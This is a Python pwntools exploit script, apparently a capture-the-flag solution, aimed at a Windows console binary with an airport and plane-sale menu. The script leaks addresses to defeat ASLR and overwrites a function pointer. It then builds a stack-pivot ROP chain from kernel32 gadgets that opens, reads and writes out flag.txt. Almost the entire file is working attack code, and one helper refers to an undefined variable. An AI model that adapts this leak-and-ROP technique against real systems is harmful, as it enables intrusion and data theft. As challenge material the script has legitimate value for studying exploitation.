#!/usr/bin/env python
# Author: b0yd
# Ex: AppJailLauncher.exe /outbound /key:flag.txt /port:4444 ConsoleApplication2.exe

from pwn import *
import sys
import binascii

#####
##Uncomment the following code to use BugId as the test harness while trying to catch crashes
#
#sBaseFolderPath = "C:\Users\user\Documents\GitHub\BugId"
#for sPath in [sBaseFolderPath] + [os.path.join(sBaseFolderPath, x) for x in ["modules"]]:
#  if sPath not in sys.path:
#    sys.path.insert(0, sPath);
    
#import BugId

#def bugIdFunc(pid_arg):
#    BugId.fuMain(['--pids='+str(pid)])

def eip( input ):
    buf = '0\n'
    buf += "C" * 0xe
    buf += input +  ("\x00")
    buf += "\xff" * ( 0x400 - len(buf))
    r.send(buf)

def make(dep, arr, time):
    r.sendline('1')
    r.recvuntil(': ')       
    r.sendline(str(dep))
    r.recvuntil(': ')
    r.sendline(str(arr))
    data = r.recv()
    if "Arrival" in data:
        r.sendline(str(time))
        r.recvuntil('?\n')

def sale(pl, name, cash):
	r.sendline('2')
	r.recvuntil(': ')
	r.sendline(str(pl))
	r.recvuntil(': ')
	r.sendline(name)
	r.recvuntil(': ')
	r.sendline(str(cash))
	r.recvuntil('?\n')

def land(pl):    
    r.sendline('3')
    r.recvuntil('? ')    
    buf += cyclic( 0x400 - len(buf))    
    r.send(buf)
    r.recvuntil('?\n')

def airport_info_leak():
    r.sendline('4')
    return r.recvuntil('?\n')
    
def plane_info_leak(pl):
    r.sendline('5')
    r.recvuntil('Which Plane: ')
    r.sendline(str(pl))
    r.recvuntil('From: ')
    return r.recvuntil('?\n')

def exploit(r):
    r.recvuntil('?\n')
    
    #Get memory leak from menu 4
    data = airport_info_leak().split()
    money = ( int(data[8]) - 0xC340C483489448) ^ 0xFFFFFF
    bin_addr = int(data[11]) ^ 0xFFFFFF   #Have to xor
    
    leak_offset =  (0x7FF70C714AF0 - 0x7FF70C700000)
    read_buf_off = (0x7FF70C714688 - 0x7FF70C700000)   
    import_tbl_off = (0x7FF70C712000 - 0x7FF70C700000) 
    
    base_addr = bin_addr - leak_offset
    log.info("App Base Address: " + hex(base_addr))
    
    #Make the first plane
    make(5, 4, 5555555555)
        
    #struct_null_ptr_bug_ptr_data struc ; (sizeof=0x202C, align=0x4, mappedto_36)
    #00000000 customer_count  dd ?
    #00000004 gap4            dd ?
    #00000008 ticket_arr      db 4096 dup(?)          ; ticket sale array
    #00001008 num_of_planes   dq ?
    #00001010 plane_array     db 4096 dup(?)
    #00002010 money_earned?   dq ?
    #00002018 overwritable_func_ptr dq ?              ; called when 0 menu is called
    #00002020 gap2020         db 8 dup(?)
    #00002028 func_ptr_arg    dd ?
    #0000202C struct_null_ptr_bug_ptr_data ends    
        
    #Get gadgets from the application
    pe = PE(bin_path)
    rop = ROP(pe, load_all=True)
   
    #Get stack pivot from main binary
    #This gadget was strategically place because nothing usable exists in kernel32 or mscvrt
    gadget_iter = rop.search_iter( regs=["rsp", "rax"], ops=["xchg"] )
    gadget_list = list(gadget_iter)
       
    gadget = gadget_list[1]
    pivot_off = gadget.address & 0xffffffff
    log.info("Pivot offset: " + hex(pivot_off) )
    
    cust = 0x402
    for j in range(cust, cust * 2):                          
        buf = ''
        buf += "B" * 0x200
        sale(0, buf, j)    
        
    #Get gadgets from the application
    pe = PE("C:\\Divided\\kernel32.dll")
    rop = ROP(pe, load_all=True)
    log.info("Number of gadgets loaded: %d" % len(rop.gadgets) )
    log.info("Looking for pop instructions")
    
    #Resolve VirtualAlloc address
    virtual_alloc_off = rop.resolve("VirtualAlloc")
    k32_base = money - virtual_alloc_off
    log.info("Kernel32 Base: " + hex(k32_base))    
        
    #Get gadget to align stack for file open
    #https://social.msdn.microsoft.com/Forums/en-US/306ba651-59d4-4dba-934b-3be247b12d4e/movaps-gp-in-createfilea-after-upgrading-to-win10?forum=windowscompatibility
    align_gadj = None
    for piv,addr in rop.pivots.iteritems():
        if piv == 10:
            align_gadj = addr & 0xffffffff  #Need to add 4
            break
            
    if align_gadj == None:
        log.info("Couldn't find gadget to align the stack")
        sys.exit(1)       
        
    align_rop = align_gadj + k32_base
    buf = p64(align_rop)
   
    #Get pop rax gadget   
    rax_gadg = None
    gadget_iter = rop.search_iter( regs=["rax"], ops=["pop"] )
    gadget_list = list(gadget_iter)
    for gadget in gadget_list:
        if len(gadget.insns) == 2 and gadget.move == 8:
            rax_gadg = gadget
            break
            
    if rax_gadg == None:
        log.info("Couldn't find gadget for pop rax")
        sys.exit(1)
        
    rax_off = rax_gadg.address & 0xffffffff
    rax_rop = rax_off + k32_base
    buf += p64(rax_rop)
    buf += "C" * 6        #Garbage for stack alignment
    ret_addr = rax_rop + 1
    buf += p64(ret_addr)
    buf += p64(ret_addr)  #Align 8 extra bytes
    
    #Get arg1 pop
    rcx_gadg = None
    gadget_iter = rop.search_iter( regs=["rcx"], ops=["pop", "jmp"] )
    gadget_list = list(gadget_iter)
    for gadget in gadget_list:
        if len(gadget.insns) == 2 and gadget.move == 4:
            rcx_gadg = gadget
            break
    
    if rcx_gadg == None:
        log.info("Couldn't find gadget for pop rcx")
        sys.exit(1)
            
    rcx_off = (rcx_gadg.address)& 0xffffffff
    rcx_rop = rcx_off + k32_base
    buf += p64(rcx_rop)
    buf += p64(read_buf_off + base_addr + 0x10 )   #Ptr to file name
    
    #Get pop rdx gadget
    rdx_gadg = None
    gadget_iter = rop.search_iter( regs=["rdx"], ops=["pop"] )
    gadget_list = list(gadget_iter)
    for gadget in gadget_list:
        if len(gadget.insns) == 2:
            rdx_gadg = gadget
            break
            
    if rdx_gadg == None:
        log.info("Couldn't find gadget for pop rdx")
        sys.exit(1)
        
    rdx_off = rdx_gadg.address & 0xffffffff
    rdx_rop = rdx_off + k32_base
    buf += p64(rdx_rop)
    buf += p64(0)        #Read flag for file open    
    
    #Add file open call
    lopen_off = rop.resolve("_lopen")
    buf += p64(lopen_off + k32_base) 
    
    #Skip over garbage
    buf += p64(rdx_rop)
    buf += "C" * 8          #Garbage that gets overwritten
    
    rax_gadg = None
    gadget_iter = rop.search_iter( dst_regs=["ecx"], src_regs=["eax", "r9d"], ops=["mov"] )
    gadget_list = list(gadget_iter)
    for gadget in gadget_list:
        if gadget.move == 0x2c:
            rax_gadg = gadget
            break
            
    if rax_gadg == None:
        log.info("Couldn't find gadget for pop rax")
        sys.exit(1)
    
    #Move file handle to rcx for next call
    rax_off = rax_gadg.address & 0xffffffff
    rax_rop = rax_off + k32_base
    buf += p64(rax_rop)
    
    buf += "D" * 0x28      #Garbage
    buf += p64(rdx_rop)
    buf += p64(read_buf_off + base_addr + 0x30)          #Ptr to data section buf
    
    #Get pop rbx gadget
    rbx_gadg = None
    gadget_iter = rop.search_iter( dst_regs=["rbx"], ops=["pop"] )
    gadget_list = list(gadget_iter)
    for gadget in gadget_list:
        if len(gadget.insns) == 2 and gadget.move == 8:
            rbx_gadg = gadget
            break
            
    if rbx_gadg == None:
        log.info("Couldn't find gadget for pop rbx")
        sys.exit(1)
        
    rbx_off = rbx_gadg.address & 0xffffffff
    rbx_rop = rbx_off + k32_base
    buf += p64(rbx_rop)  
    buf += p64(ret_addr )
    
    #Get gadget to clear r8
    r8b_gadg = None
    gadget_iter = rop.search_iter( dst_regs=["r8d", "rbx"], ops=["xor"] )
    gadget_list = list(gadget_iter)
    for gadget in gadget_list:
        if len(gadget.insns) == 0x2:
            r8b_gadg = gadget        
                   
    if r8b_gadg == None:
        log.info("Couldn't find gadget for pop r8b")
        sys.exit(1)
        
    r8_off = r8b_gadg.address & 0xffffffff
    r8_rop = r8_off + k32_base
    buf += p64(r8_rop)
    buf += "D" * 0x38      #Garbage
    
    #Get pop rax gadget
    rax_gadg = None
    gadget_iter = rop.search_iter( dst_regs=["rax"], ops=["pop"] )
    gadget_list = list(gadget_iter)
    for gadget in gadget_list:
        if len(gadget.insns) == 2 and gadget.move == 8:
            rax_gadg = gadget
            break
            
    if rax_gadg == None:
        log.info("Couldn't find gadget for pop rax")
        sys.exit(1)
        
    rax_off = rax_gadg.address & 0xffffffff
    rax_rop = rax_off + k32_base
    buf += p64(rax_rop)  
    buf += p64(read_buf_off + base_addr + 0x20 )
    
    #Get add r8b, rax gadget
    r8b_gadg = None
    gadget_iter = rop.search_iter( dst_regs=["r8b"], ops=["add"] )
    gadget_list = list(gadget_iter)
    for gadget in gadget_list:
        r8b_gadg = gadget   
        break
                   
    if r8b_gadg == None:
        log.info("Couldn't find gadget for pop r8b")
        sys.exit(1)
        
    r8_off = r8b_gadg.address & 0xffffffff
    r8_rop = r8_off + k32_base
    buf += p64(r8_rop)
    buf += "D" * 0x28      #Garbage
    
    #Add read call
    lread_off = rop.resolve("_lread")
    buf += p64(lread_off + k32_base) 
    
    #Skip over garbage
    buf += p64(rdx_rop)
    buf += "C" * 8          #Garbage that gets overwritten
    
    #Get pop rsi gadget
    rsi_gadg = None
    gadget_iter = rop.search_iter( dst_regs=["rsi"], ops=["pop"] )
    gadget_list = list(gadget_iter)
    for gadget in gadget_list:
        if len(gadget.insns) == 2 and gadget.move == 8:
            rsi_gadg = gadget
            break
            
    if rsi_gadg == None:
        log.info("Couldn't find gadget for pop rax")
        sys.exit(1)
        
    rsi_off = rsi_gadg.address & 0xffffffff
    rsi_rop = rsi_off + k32_base
    buf += p64(rsi_rop)
    buf += p64(read_buf_off + base_addr + 0x30 )  #Flag buffer
    
    #Write length
    buf += p64(rbx_rop)  
    buf += p64( 100 )                
    
    #Write out the flag
    write_off = ( 0x0007FF703C2CE70 - 0x0007FF703C20000 )  #Offset to writefile in binary
    buf += p64( write_off + base_addr )
    
    #Garbage
    buf += "C"* ( 0x200 - len(buf))
    sale(0, buf, pivot_off + base_addr)

    #Trigger call to function ptr overwrite
    buf = 'flag.txt'
    eip(buf)
   
    #Drop into interactive
    r.interactive()
                    
if __name__ == "__main__":

    bin_path = 'C:\\Divided\\ConsoleApplication2.exe' 
    r = remote('127.0.0.1', 4444)
    #r = process([bin_path])
    #pid = util.proc.pidof(p)[0]
    
    #t = Thread(target = bugIdFunc, args = ([pid]))
    #t.daemon = True
    #t.start() #start collecting lines from the stream
    
    #pause()   
   
    #Windbg args
    #args = []
    #args = ["lm"]
    #args.append("bp ConsoleApplication2+0xf0b1")  # print plane info
    #args.append("bp ConsoleApplication2+0xFB86")  # func ptr callable
    #args.append("g")
    
    #Start the process with windbg attached
    #windbg.attach( r, args )
    #r = windbg.debug([bin_path], args )
    exploit(r)
